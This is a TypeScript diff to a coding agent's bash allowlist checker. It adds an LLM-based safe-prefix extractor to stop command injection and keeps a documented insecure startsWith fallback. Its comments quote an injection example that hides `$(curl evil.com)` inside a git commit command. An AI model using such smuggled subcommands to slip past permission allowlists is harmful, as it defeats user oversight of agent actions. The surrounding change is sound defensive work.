@@ -16,6 +16,7 @@ import path from 'path';
 import os from 'os';
 
 import { getAgentConfigHome } from '@kodax-ai/agent';
+import type { BashPrefixExtractor } from '@kodax-ai/coding';
 
 import { PermissionMode, MODIFICATION_TOOLS, FILE_MODIFICATION_TOOLS, BASH_WRITE_COMMANDS, BASH_SAFE_READ_COMMANDS } from './types.js';
 
@@ -331,9 +332,19 @@ export function parseAllowedToolPattern(entry: string): { tool: string; pattern:
 }
 
 /**
- * Check if a bash command matches an allowed pattern
+ * Check if a bash command matches an allowed pattern using LEGACY naive
+ * `startsWith` semantics. Used when no LLM-backed prefix extractor is
+ * available — see `matchesBashPatternByExtractedPrefix` for the safer path.
+ *
+ * SECURITY NOTE: this path is vulnerable to command injection via shell
+ * metacharacters (`git commit -m "x" $(curl evil.com)` matches `git commit:*`).
+ * It is preserved for backward compatibility with SDK consumers that don't
+ * have an LLM provider available; the KodaX REPL itself ALWAYS provides
+ * an extractor in production, so this branch is only exercised by tests
+ * and headless embeds. Will be removed when all known consumers migrate
+ * (target: v0.8).
  */
-function matchesBashPattern(command: string, pattern: string): boolean {
+function matchesBashPatternLegacy(command: string, pattern: string): boolean {
   // Reject "*" pattern for safety
   if (pattern === '*') return false;
 
@@ -348,32 +359,111 @@ function matchesBashPattern(command: string, pattern: string): boolean {
 }
 
 /**
- * Check if a tool call is allowed by the patterns list
+ * Match a pattern against the LLM-extracted SAFE PREFIX of a command
+ * (FEATURE_153). The extracted prefix is itself the safe prefix, so
+ * matching is exact equality (vs. legacy `startsWith` which let injection
+ * sneak past).
  *
- * Note: Only Bash tool is supported for pattern matching
+ * Examples (where extractedPrefix is the LLM output for the user's command):
+ *   command: 'git commit -m "msg"',  extractedPrefix: 'git commit'
+ *     pattern 'git commit:*'  → match (prefix === 'git commit')
+ *     pattern 'git commit'    → match (exact)
+ *     pattern 'git diff:*'    → NO match
+ *   command: 'git commit -m "x" $(curl evil)',  extractedPrefix: null
+ *     ANY pattern             → NO match (extractor said injection)
  */
-export function isToolCallAllowed(
+function matchesBashPatternByExtractedPrefix(
+  extractedPrefix: string,
+  pattern: string,
+): boolean {
+  if (pattern === '*') return false;
+  if (pattern.endsWith(':*')) {
+    const prefix = pattern.slice(0, -2);
+    return extractedPrefix === prefix;
+  }
+  return extractedPrefix === pattern;
+}
+
+/**
+ * Check if a tool call is allowed by the user's allowlist patterns.
+ *
+ * FEATURE_153 (v0.7.38) — When `extractor` is supplied, bash commands are
+ * routed through the LLM-backed prefix extractor, which:
+ *   - Returns the SAFE PREFIX of the command (e.g. `git commit` for
+ *     `git commit -m "msg"`)
+ *   - Returns `injection_detected` for inputs containing command injection
+ *     (`git commit -m "x" $(curl evil.com)`)
+ *   - Returns `no_prefix` when no safe prefix can be determined
+ * Patterns then match against the extracted prefix exactly. This eliminates
+ * the pre-FEATURE_153 startsWith-based injection surface.
+ *
+ * When `extractor` is NOT supplied, falls back to the legacy
+ * `command.startsWith(pattern)` matcher. Documented as insecure in
+ * `matchesBashPatternLegacy` — KodaX's REPL always supplies an extractor in
+ * production; the legacy branch exists for tests and headless SDK consumers
+ * without LLM access.
+ *
+ * Note: Only Bash tool is supported for pattern matching.
+ *
+ * @param toolName — tool name (only "bash" / "Bash" matched)
+ * @param input    — tool call input; reads `input.command`
+ * @param allowedPatterns — entries like `Bash(git commit:*)` from
+ *                          `~/.kodax/config.json` `alwaysAllowTools`
+ * @param extractor — optional LLM-backed bash prefix extractor (FEATURE_153)
+ * @param signal    — optional abort signal forwarded to the extractor
+ */
+export async function isToolCallAllowed(
   toolName: string,
   input: Record<string, unknown>,
-  allowedPatterns: string[]
-): boolean {
+  allowedPatterns: string[],
+  extractor?: BashPrefixExtractor,
+  signal?: AbortSignal,
+): Promise<boolean> {
   if (toolName.toLowerCase() !== 'bash') {
     return false;
   }
 
   const command = (input.command as string) ?? '';
 
+  // Determine which patterns are relevant for bash. If none, no LLM call needed.
+  const bashPatterns: Array<{ pattern: string | null }> = [];
   for (const entry of allowedPatterns) {
     const parsed = parseAllowedToolPattern(entry);
-
     if (parsed.tool !== 'bash') continue;
-    if (parsed.pattern === null) return true;
+    if (parsed.pattern === null) {
+      // Bare `Bash` pattern (no parens content) auto-allows all bash —
+      // matches legacy semantics, no extractor call needed.
+      return true;
+    }
+    bashPatterns.push({ pattern: parsed.pattern });
+  }
+  if (bashPatterns.length === 0) {
+    return false;
+  }
 
-    if (matchesBashPattern(command, parsed.pattern)) {
+  // FEATURE_153 path: extract once, match against extracted prefix.
+  if (extractor) {
+    const result = await extractor.extract(command, signal);
+    if (result.kind !== 'prefix') {
+      // injection_detected / no_prefix → no allowlist pattern can match
+      // (treat as "user hasn't allowlisted this") so the command falls
+      // through to the standard confirmation prompt.
+      return false;
+    }
+    for (const { pattern } of bashPatterns) {
+      if (pattern && matchesBashPatternByExtractedPrefix(result.value, pattern)) {
+        return true;
+      }
+    }
+    return false;
+  }
+
+  // Legacy path: naive startsWith.
+  for (const { pattern } of bashPatterns) {
+    if (pattern && matchesBashPatternLegacy(command, pattern)) {
       return true;
     }
   }
-
   return false;
 }
 
